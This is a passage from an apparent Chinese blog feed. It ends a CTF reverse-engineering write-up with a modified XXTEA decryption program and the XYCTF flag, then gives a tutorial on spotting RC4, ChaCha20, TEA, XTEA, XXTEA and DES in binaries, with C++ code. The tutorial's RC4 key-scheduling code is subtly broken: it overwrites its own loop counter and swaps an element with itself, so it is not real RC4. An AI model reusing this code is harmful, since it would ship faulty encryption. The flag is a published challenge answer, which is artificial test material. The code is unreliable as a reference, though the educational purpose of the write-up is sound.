0x61C88647</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROUNDS 12 <span class="hljs-comment">//ida 中直接看可以算出来</span></span><br><br><span class="hljs-comment">// 魔改XXTEA</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint8_t</span>* key)</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x9E3779B9</span> * ROUNDS; <span class="hljs-comment">// 初始sum = -DELTA * ROUNDS (无符号处理)</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ROUNDS; i++) &#123;<br>        <span class="hljs-type">uint32_t</span> v6 = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">5</span>;   <span class="hljs-comment">// 计算轮次相关索引</span><br>        <br>        <span class="hljs-comment">// 先处理最后一个块</span><br>        <span class="hljs-type">uint32_t</span> v9 = v[n<span class="hljs-number">-2</span>];<br>        <span class="hljs-type">int</span> idx = (v6 ^ ((n<span class="hljs-number">-1</span>) &amp; <span class="hljs-number">5</span>)) % <span class="hljs-number">6</span>;<br>        <span class="hljs-type">uint32_t</span> k = key[idx];<br>        <span class="hljs-type">uint32_t</span> expr = ((v9 ^ k) + (v[<span class="hljs-number">0</span>] ^ sum)) ^ <br>                        (((v9 &lt;&lt; <span class="hljs-number">4</span>) ^ (v[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>)) + <br>                        ((v[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">2</span>) ^ (v9 &gt;&gt; <span class="hljs-number">5</span>)));<br>        v[n<span class="hljs-number">-1</span>] -= expr;<br>        <br>        <span class="hljs-comment">// 逆序处理前n-1个块</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n<span class="hljs-number">-2</span>; j &gt;= <span class="hljs-number">0</span>; j--) &#123;<br>            v9 = (j == <span class="hljs-number">0</span>) ? v[n<span class="hljs-number">-1</span>] : v[j<span class="hljs-number">-1</span>];  <span class="hljs-comment">// 获取前一个块的值</span><br>            idx = (v6 ^ (j &amp; <span class="hljs-number">5</span>)) % <span class="hljs-number">6</span>;         <span class="hljs-comment">// 计算密钥索引</span><br>            k = key[idx];<br>            expr = ((v9 ^ k) + (v[j<span class="hljs-number">+1</span>] ^ sum)) ^ <br>                   (((v9 &lt;&lt; <span class="hljs-number">4</span>) ^ (v[j<span class="hljs-number">+1</span>] &gt;&gt; <span class="hljs-number">3</span>)) + <br>                   ((v[j<span class="hljs-number">+1</span>] &lt;&lt; <span class="hljs-number">2</span>) ^ (v9 &gt;&gt; <span class="hljs-number">5</span>)));<br>            v[j] -= expr;<br>        &#125;<br>        sum += DELTA;  <span class="hljs-comment">// 解密时sum递增</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 密文数据（小端序）</span><br>    <span class="hljs-type">uint32_t</span> cipher[] = &#123;<br>        <span class="hljs-number">0x66697271</span>, <span class="hljs-number">0x896E2285</span>, <span class="hljs-number">0xC5188C1B</span>, <span class="hljs-number">0x72BCFD03</span>,<br>        <span class="hljs-number">0x538011CA</span>, <span class="hljs-number">0x4DA146AC</span>, <span class="hljs-number">0x86630D6B</span>, <span class="hljs-number">0xF89797F0</span><br>    &#125;;<br>    <br>    <span class="hljs-comment">// 密钥&quot;XYCTF!&quot;的字节数组</span><br>    <span class="hljs-type">uint8_t</span> key[] = &#123;<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>&#125;;<br>    <br>    <span class="hljs-comment">// 执行解密</span><br>    <span class="hljs-built_in">decrypt</span>(cipher, <span class="hljs-number">8</span>, key);<br>    <br>    <span class="hljs-comment">// 输出解密后的16进制和ASCII</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted Hex:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08X &quot;</span>, cipher[i]);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\nASCII:\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* flag = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)cipher;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, flag[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// Decrypted Hex:</span><br><span class="hljs-comment">// 54435958 58587B46 5F414554 5F444E41 315F335A 30535F73 7361655F 7D212179 </span><br><br><span class="hljs-comment">// ASCII:</span><br><span class="hljs-comment">// XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</span><br></code></pre></td></tr></table></figure><p>flag 为<code>XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RE中的密码学</title>
    <link href="/2025/05/02/crypto/"/>
    <url>/2025/05/02/crypto/</url>
    
    <content type="html"><![CDATA[<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>特征就是密文仅由明文与密钥流经过异或运算得到。只要识别出流密码,我们就可以选择动态调试获取密钥流或者直接把目标密文 patch 进去拿输出就可以了,常见的有 RC4、Salsa20 以及 ChaCha20.</p><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p><strong>特征识别</strong></p><ul><li>长度为 256 的 S 盒，且在每一步生成与加密过程中都伴随着 S 盒的 swap 操作</li><li>很多取模操作</li><li>有多个次数为 256 的循环</li><li>最后的操作为异或</li></ul><p><strong>加密流程简述</strong></p><ul><li>先创建一个长度为 256 的 S 盒，初始值为 0~255升序排列，然后根据密钥，用 ksa (密钥调度算法)对 S 盒进行替换,完成后将不再使用密钥</li><li>PRGA （伪随机生成算法）使用两个变量 i 和 j，循环动态变化，在每步中：i 自增 1，j 根据 S[i]变化；交换 S[i] 和 S[j]；从 S[(S[i] + S[j]) % 256] 位置取出一个字节作为密钥流字节 K。最后用这个密钥流字节 K，和明文字节做异或</li></ul><p><strong>代码实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">//初始化 S 盒（0~255）并根据密钥打乱</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KSA</span><span class="hljs-params">(vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; S,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; key)</span></span>&#123;<br>    <span class="hljs-type">int</span> key_length=key.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-comment">//初始化 S </span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;++i)&#123;<br>        S[i]=i;<br>    &#125;<br>    <span class="hljs-comment">//根据密钥打乱 S</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">256</span>;++j)&#123;<br>        j=(j+S[j]+key[j%key_length])%<span class="hljs-number">256</span>;<br>        <span class="hljs-built_in">swap</span>(S[j],S[j]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//生成密钥流，并加密/解密输入数据</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">RC4</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; key,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data)</span></span>&#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">S</span><span class="hljs-params">(<span class="hljs-number">256</span>)</span></span>;<br>    <span class="hljs-built_in">KSA</span>(S,key);<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; output;<br>    output.<span class="hljs-built_in">reserve</span>(data.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> k=<span class="hljs-number">0</span>;k&lt;data.<span class="hljs-built_in">size</span>();++k)&#123;<br>        i=(i<span class="hljs-number">+1</span>)%<span class="hljs-number">256</span>;<br>        j=(j+S[i])%<span class="hljs-number">256</span>;<br>        <span class="hljs-built_in">swap</span>(S[i],S[j]);<br>        <span class="hljs-type">int</span> t=(S[i]+S[j])%<span class="hljs-number">256</span>;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> K=S[t];<br>        output.<span class="hljs-built_in">push_back</span>(data[k]^K); <span class="hljs-comment">//明文字节 XOR 密钥流字节</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> output;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_hex</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data)</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c:data)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>,c);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    string key_str=<span class="hljs-string">&quot;OceanBlue&quot;</span>;<br>    string plaintext_str=<span class="hljs-string">&quot;ISeeYourSecretMessage&quot;</span>; <span class="hljs-comment">//明文</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">key</span><span class="hljs-params">(key_str.begin(),key_str.end())</span></span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">plaintext</span><span class="hljs-params">(plaintext_str.begin(),plaintext_str.end())</span></span>;<br>    <span class="hljs-comment">//加密</span><br>    vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; ciphertext=<span class="hljs-built_in">RC4</span>(key,plaintext);<br>    cout&lt;&lt;<span class="hljs-string">&quot;hex:&quot;</span>;<br>    <span class="hljs-built_in">print_hex</span>(ciphertext);<br>    <span class="hljs-comment">//解密</span><br>    vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; decryptedtext=<span class="hljs-built_in">RC4</span>(key,ciphertext);<br>    cout &lt;&lt; <span class="hljs-string">&quot;encoded: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c : decryptedtext) &#123;<br>        cout &lt;&lt; c;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChaCha20"><a href="#ChaCha20" class="headerlink" title="ChaCha20"></a>ChaCha20</h3><ul><li>20 表示该算法有 20 轮加密</li><li>有一个初始矩阵，矩阵的输入为一个256位的密钥、64位随机数、64位计数器值以及4×32位的常数，它们均填充在32位整型数组中作为初始矩阵</li><li>识别ChaCha20的主要特征是四个常数0x61707865 0x3320646e 0x79622d32 0x6b206574按小端存储转为ASCII字符是”expand 32-byte k”</li></ul><h2 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h2><p>块密码是一种对固定长度的明文数据块进行加密的对称加密算法，基本思想是：将明文分成若干个固定长度的数据块（如64位或128位）；<br>每个数据块独立或依赖某种模式（如CBC、EBC等）进行加密；加密和解密使用相同的密钥；常见的块加密算法包括：DES、AES、TEA等</p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p><strong>特征识别</strong></p><ul><li>有一个 delta 常量，值是0x9e3779b9(可能会被魔改)</li><li>每轮先进行 sum+&#x3D;delta，再进行 左移4，异或，右移5</li></ul><p><strong>加密流程简述</strong></p><ul><li>将64位明文分成两个部分，v0 和 v1，各32位</li><li>将128位的密钥分成四个32位(4字节)的子密钥 k1,k2,k3,k4</li><li>初始化常量 delta，初始化sum&#x3D;0</li><li>加密通常为 32 轮循环，每次包括两轮，共64轮</li></ul><p><strong>代码实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>    &#123;<br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>    &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h3><p>XTEA 是 TEA 的改进版，增加了更多的密钥表，移位和异或操作等,TEA 的子密钥是通过下标取的，XTEA 的子密钥是通过计算来取,注意<code>sum+key[sum&amp;3]</code>和<code>sum+key[(sum&gt;&gt;11)&amp;3]</code><br><strong>代码实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds,<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0</span>,delta=<span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>        v0+=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>        sum+=delta;<br>        v1+=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0;<br>    v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds,<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],delta=<span class="hljs-number">0x9e3779b9</span>,sum=delta*num_rounds;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>        v1-=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>        sum-=delta;<br>        v0-=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0;<br>    v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h3><ul><li>明文块的大小可以是任意的(最少两个32位即64位)，被分割为若干个32位的整数（即4字节为一个单位），形成一个数组 v[0] … v[n-1]</li><li>采用以下混合函数来确保扩散和混淆：<br><code>MX = ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (k[p &amp; 3 ^ e] ^ z));</code></li></ul><p><strong>解密脚本</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;    <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v[] = &#123;<span class="hljs-number">0xE74EB323</span>, <span class="hljs-number">0xB7A72836</span>, <span class="hljs-number">0x59CA6FE2</span>, <span class="hljs-number">0X967CC5C1</span>, <span class="hljs-number">0XE7802674</span>, <span class="hljs-number">0X3D2D54E6</span>, <span class="hljs-number">0X8A9D0356</span>, <span class="hljs-number">0X99DCC39C</span>, <span class="hljs-number">0X7026D8ED</span>, <span class="hljs-number">0x6A33FDAD</span>, <span class="hljs-number">0xF496550A</span>, <span class="hljs-number">0x5C9C6F9E</span>, <span class="hljs-number">0x1BE5D04C</span>, <span class="hljs-number">0x6723AE17</span>, <span class="hljs-number">0x5270A5C2</span>, <span class="hljs-number">0xAC42130A</span>, <span class="hljs-number">0x84BE67B2</span>, <span class="hljs-number">0x705CC779</span>, <span class="hljs-number">0x5C513D98</span>, <span class="hljs-number">0xFB36DA2D</span>, <span class="hljs-number">0x22179645</span>, <span class="hljs-number">0x5CE3529D</span>, <span class="hljs-number">0XD189E1FB</span>, <span class="hljs-number">0XE85BD489</span>, <span class="hljs-number">0X73C8D11F</span>, <span class="hljs-number">0X54B5C196</span>, <span class="hljs-number">0XB67CB490</span>, <span class="hljs-number">0X2117E4CA</span>, <span class="hljs-number">0X9DE3F994</span>, <span class="hljs-number">0X2F5AA1AA</span>, <span class="hljs-number">0XA7E801FD</span>, <span class="hljs-number">0XC30D6EAB</span>, <span class="hljs-number">0X1BADDC9C</span>, <span class="hljs-number">0X3453B04A</span>, <span class="hljs-number">0X92A406F9</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> y, z, p, rounds, e;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">35</span>; <span class="hljs-comment">// 35个32位整数</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>    y = v[<span class="hljs-number">0</span>];<br>    sum = (rounds * DELTA) &amp; <span class="hljs-number">0xffffffff</span>; <span class="hljs-comment">// 取后八位</span><br>    <span class="hljs-keyword">do</span>                                   <br>    &#123;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) <span class="hljs-comment">// 34次循环</span><br>        &#123;<br>            z = v[p - <span class="hljs-number">1</span>];<br>            v[p] = (v[p] - ((((z &gt;&gt; <span class="hljs-number">5</span>) ^ (y &lt;&lt; <span class="hljs-number">2</span>)) + ((y &gt;&gt; <span class="hljs-number">3</span>) ^ (z &lt;&lt; <span class="hljs-number">4</span>))) ^ ((key[(p ^ e) &amp; <span class="hljs-number">3</span>] ^ z) + (y ^ sum)))) &amp; <span class="hljs-number">0xffffffff</span>;<br>            y = v[p];<br>        &#125;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - (((key[(p ^ e) &amp; <span class="hljs-number">3</span>] ^ z) + (y ^ sum)) ^ (((y &lt;&lt; <span class="hljs-number">2</span>) ^ (z &gt;&gt; <span class="hljs-number">5</span>)) + ((z &lt;&lt; <span class="hljs-number">4</span>) ^ (y &gt;&gt; <span class="hljs-number">3</span>))))) &amp; <span class="hljs-number">0xffffffff</span>;<br>        y = v[<span class="hljs-number">0</span>];<br>        sum = (sum - DELTA) &amp; <span class="hljs-number">0xffffffff</span>;<br>    &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>分组加密算法，明文为64位(8字节)一组，密钥的长度为64位(8字节)(3DES用192位密钥)，但每8位中的最后一位用于奇偶校验，实际有效密钥长度为56位</p><p><strong>特征识别</strong></p><ul><li>DES共有8个不同的S盒（S1~S8），每个S盒是一个4行×16列的查找表</li><li>多个置换表对数据位进行重新排列:32位P盒、48位E盒、56位PC-1、64位IP&#x2F;IP⁻¹</li></ul><p><strong>代码实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 